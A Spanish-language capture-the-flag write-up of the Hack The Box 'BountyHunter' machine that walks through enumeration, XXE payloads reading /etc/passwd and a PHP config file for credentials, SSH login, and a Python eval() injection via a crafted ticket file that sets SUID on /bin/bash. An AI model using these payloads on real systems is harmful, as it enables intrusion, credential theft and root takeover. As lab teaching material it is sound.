#  BOUNTYHUNTERMACHINE

**Autor: Christian Jimenez**

![logo](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/1.PNG)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 - v -n 10.129.145.157 -oG allPorts
```

La salida nos muesta el puerto 22 y 80 abiertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/2.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p22,80 -sV -sC 10.129.145.157 -oN targeted
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/3.PNG)

Es claro que tenemos que enfrentarnos a una pagina web, vamos a abrir en el navegador:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/4.PNG)

El wappalyzer muestra lo siguiente:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/5.PNG)

si nos vamos a la pestaña de portal vemos por la url que interpreta el lenguaje PHP:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/6.PNG)

Si vamos al link que nos dice la pagina vemos lo siguiente:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/7.PNG)

Antes de analizar esto,veamos si hay algun recurso disponible mas con wfuzz:

```bash
wfuzz -c -t 300 --hw=1470 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.100/FUZZ
```

Vemos que hay una ruta **resources**, veamos que hay ahi:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/8.PNG)

Leamos el readme:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/9.PNG)

Parece una pista pero nada interesante, leamos ahora el bountylog.js, cualquier archivo de log siempre es importante:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/10.PNG)

Parece una estructura en xml que se envia, parece que es la estructura con la que envia en ese formulario del portal que vimos.

**UNA COSA QUE SE PUEDE HACER ES FUZZEAR CON LA EXTENSION QUE INTERPRETA EL SERVIDOR, EN ESTE CASO PHP**

```bash
wfuzz -c -t 300 --hw=1470 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.100/FUZZ.php
```

Y encontramos un archivo PHP potencial de base de datos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/11.PNG)

No podemos leer su contenido, a no ser que encontremos una vulnerabilidad de LFI, XSS o XXE, esta ultima es la que estoy pensando por ese archivo que vimos con la estructura de xml.

## EXPLOTACION

Vamos a llenar ese formulario del portal y vamos a abrirnos el burpsuite para ver como se mandan esos datos. Deberia mandarse como la estructura de los logs ya que tiene los mismos campos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/7.PNG)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/10.PNG)

mandamos cualquier valor en el formulario y lo interceptamos con el burpsuite:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/12.PNG)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/13.PNG)

Vemos que se manda una data encriptada, el tipo de encriptacion parece url encode por el valor **%3D** que representa un **=**. Podemos usar la pestaña de decoder de burpsuite para desencriptarlo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/14.PNG)

Ahora parece un base64 por los **\=\=**  del final, vamos a hacer un decode en base64:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/15.PNG)

Vemos que se manda una estructura como el de los logs, cuando se manda informacion en XML o se puede cargar un XML en una pagina web, podemos testear el ataque de XXE (XML External Entity).

Es crear una estructura en xml donde nosotros podemos leer archivos locales o hacer muchas cosas mas. Vimos anteriormente que habia un archivo **db.php** en el servidor y con XXE podriamos intentar leer ese archivo. Ven como se conectan las cosas.

El ataque de XXE tendria la siguiente estructura:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "filter:///etc/passwd" >]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
	</bugreport>
```

En este ejemplo leemos el archivo **/etc/passwd** y la carga util (**xxe;**) se lo coloca en un valor de un atributo el cual pensamos que es vulnerable, como no sabemos en cual podria se ese atributo lo podemos mandar en todos. Puede probar varios wrapper de LFI para PHP para leer un archivo, por ejemplo:

```bash
file:///etc/passwd
/etc/passwd
../../../../../../etc/passwd
etc.
```

el que funciono para ver el archivo /etc/passwd es el siguiente:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "/etc/passwd" >]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
	</bugreport>
```

Mediante el decoder de burpsuit podemos codficarlo primero en base64 y luego en urlencode para despues mediante el repeater mandarlo como data:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/16.PNG)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/17.PNG)

Vemos el contenido del /etc/passwd en que observamos los usuarios del sistema, hay uno que tiene opcion a consola, eso se lo verifica al final de cada usuario, deberia decir /bin/bash y el usuario **development** lo tiene.

Ahora podemos acceder al archivo **db.php** pero como es un archivo en php no nos mostrara el contenido porque la web lo interpreta, lo que podemos hacer es usar un wrapper de PHP que permite mostrar el contenido de archivo .php en base64 y mostrarlo por pantalla, para luego copiar ese contenido a un decoder y verlo en texto plano.

el payload quedaria de la siguiente manera:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
	</bugreport>
```

con este filtro **php://filter/convert.base64-encode/resource=** sile especificamos un archivo del servidor ya sea db.php o ../../../../db.php podemos obtener su contenido en base64. lo codificamos nuevamente y lomandamos por el repeater:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/18.PNG)

Nos muestra el contenido encodeado, si lo copiamos y vamos al decoder y los desciframos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/19.PNG)

Vemos una credenciales de base de datos del usuario admin, no estaba el puerto de MySQL u otro DBMS abierto y el usuario admin no lo vimos en el /etc/passwd.

Pero si vimos el puerto de ssh abierto y hay un usario con bash que es el development, probemos estas credenciales:

```bash
ssh development@10.10.11.100
<password db.php>
```


Estamos dentro y podemos leer la flag.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/20.PNG)


## ELEVACION DE PRIVILEGIOS

hacemos un reconocimiento del sistema y con el comando:

```bash
sudo -l
```

vemos algo interesante:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/21.PNG)

podemos ejecutar un script con python3, si tuvieramos permisos de escritura en ese script seria pan comido, pero no es asi:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/22.PNG)

Pero podemos ver que es lo que hace:

```bash
cat /opt/skytrain_inc/ticketValidator.py
```

vamos a explicar por partes:

tenemos la funcion **main()**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/23.PNG)

- Vemos que nos pide el path de un ticket.
- guarda la salida de la funcion **load_ticket()** en una variable ticket.
- manda ese ticket a la funcion **evaluate()**.
- hace un condicional para ver si hay respuesta de esa funcion.

veamos ahora la funcion **load()**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/24.PNG)

- verifica si el la ruta que se pasa como parametro tiene la extension .md.
- si es asi retorna el contenido y sino muestra un mensaje de error.

Y por ultimo la funcion **evaluate()**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/25.PNG)

- verifica el contenido del archivo .md que se le pasa como parametro.
- verifica si comienza con **# Skytrain Inc** mediante la funcion **startswith()**.
- verifica si la siguiente linea comienza con **## Ticket to ** mediante la funcion **startswith()**.
- verifica si la siguiente linea comienza con **__Ticket Code:__** mediante la funcion **startswith()**.
- verifica si la siguiente linea comienza con **\*\*** mediante la funcion **startswith()**.
- En esa misma linea se hace un **replace** de **\*\*** por "".
- se hace un **split** del caracter **+** y se toma el primer elemento.
- ese elemento se lo parsea a **int** y hace la validacion si modulo de ese elemento es igual a 4 (%7\=\=4).
- si es asi se manda a la funcion **eval()** toda esa lnea pero haciendo un **replace** nuevamente de **\*\*** por "".
- por ultimo se comprueba si el resultado de la funcion **eval()** es mayor a 100.

Se tuvo que debbuguear muchas partes para saber todo eso. ¿Cómo podriamos aprovecharnos de ese script a nivel de entrada ya que no tenemos permisos de escritura?

La idea general es crear un archivo .md que cumpla todas esas condiciones hasta llegar a la funcion **eval()**. ¿Por qué hasta ahi? pues hay una forma de aprovecharnos de esa funcion, pero primero hay que entender que hace esa funcion:

> La funcion eval() permite evaluar expresiones arbitrarias de Python a partir de una entrada basada en cadenas o en código compilado. Esta función puede ser útil cuando intentas evaluar dinámicamente expresiones de Python desde cualquier entrada que venga como una cadena o un objeto de código compilado.  

Super resumido es que puede ejecutar cadenas.

Por ejemplo:

```python
eval("1024 + 1024")

# Resultado de la funcion: 2048
```

No imprimio la cadena como tal, sino que ejecuto lo que la cadena hace.

Otro ejemplo:

```python
x = 100
eval("x * 2")
# Resultado de la funcion: 200
```

Entonces, ¿Cómo nos aprovechamos de esto?

Ya que interpreta cadenas podriamos hacer que una cadena contenga por ejemplo la importacion de la libreria systema y despues invocar un comando del sistema y como podemos ejecutarlo como rott sin proporcionar contraseña podremos ejecutar cualquier comando.

Esa es la idea. La cadena podria tener lo siguiente:

```python
"import os; os.system('whoami')"
```

Si, pero de esa manera no me funciono, lo podemos hacer de la siguiente manera que si funciona:

```python
"__import__('os').system('ls')"

o

"eval(compile("import os;os.system(\\"ls\\")","q","exec"))"
```

Ahora vamos a crear un archivo .md que cumpla lo que pide para llegar a la funcion **eval()**:

CREACION DEL ARCHIVO .md

* verifica si comienza con **# Skytrain Inc** mediante la funcion **startswith()**.

```markdown
# Skytrain Inc
```

* verifica si la siguiente linea comienza con **## Ticket to ** mediante la funcion **startswith()**.

```markdown
# Skytrain Inc
## Ticket to 
```

* verifica si la siguiente linea comienza con **__Ticket Code:__** mediante la funcion **startswith()**.

```markdown
# Skytrain Inc
## Ticket to 
__Ticket Code:__
```

* verifica si la siguiente linea comienza con **\*\*** mediante la funcion **startswith()**.
* En esa misma linea se hace un **replace** de **\*\*** por "".
* se hace un **split** del caracter **+** y se toma el primer elemento.
* ese elemento se lo parsea a **int** y hace la validacion si modulo de ese elemento es igual a 4 (%7\=\=4).
* si es asi se manda a la funcion **eval()** toda esa lnea pero haciendo un **replace** nuevamente de **\*\*** por "".
* por ultimo se comprueba si el resultado de la funcion **eval()** es mayor a 100.

```markdown
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102+1==103 and __import__('os').system('whoami')==False
```

La ultima linea es donde esta lo bueno, si hacemos un **replace** nuevamente de **\*\*** por "" y se hace un **split** del caracter **+** y se toma el primer elemento tenemos el 102. Como saque este valor, pues multiplique 7\*14 que es igual a 98 y le sume 4 para se cumpla la condicion del modulo. Pueden hacer con cualquier otro numero no necesariamente 14. 

A la funcion **eval()** para que ejecute otra expresion podriamos mandarle que ejecute condiciones booleanas como de un condicional, con **and** concatenamos otra expresion. Se mando la siguiente estructura:

```bash
(x+y==z) and (a==b)
```

pero representado de la siguiente manera:

```bash
102+1==103 and __import__('os').system('whoami')==False
```

La segunda expresion puede igualarlo a lo que quiera no necesariamente a **False**.

En el codigo, despues de la funcion **eval()** sigue este pedaso de codigo:

```python
if validationNumber > 100:
     return True
else:
     return False
```

Donde **validationNumber** es el resultado de lo que enviamos al **eval()** y obviamente no es mayor que 100 porque se ejecutan 2 expresiones por lo que retornara **False** y eso nos mostrara el mensaje **Invalid ticket** pero eso no quiere decir que nuestro comando no se haya ejecutado:

Colocamos todo ese contenido a un archivo llamado **test.md** o como quieran llamarlo, ejecutamos el script como sudo y mencionamos la ruta del archivo test.md:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/26.PNG)

Como ven se ejecuto el comando.

ahora podemos leer la flag desde ese archivo .md, entablarte una reverse shell con netcat o crear un usuario como administrador. Yo obtare por lo mas facil para mi que es asignar permisos SUID a la /bin/bash:

```markdown
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102+1==103 and __import__('os').system('chmod +4755 /bin/bash')==False
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/27.PNG)

No muestra ninguna salida el comando en si.

Pero si comprobamos:

```bash
ls -la /bin/bash
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/28.PNG)

y si hacemos un:

```bash
/bin/bash -p
```

Ya somos root y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BOUNTYHUNTER/images/29.PNG)

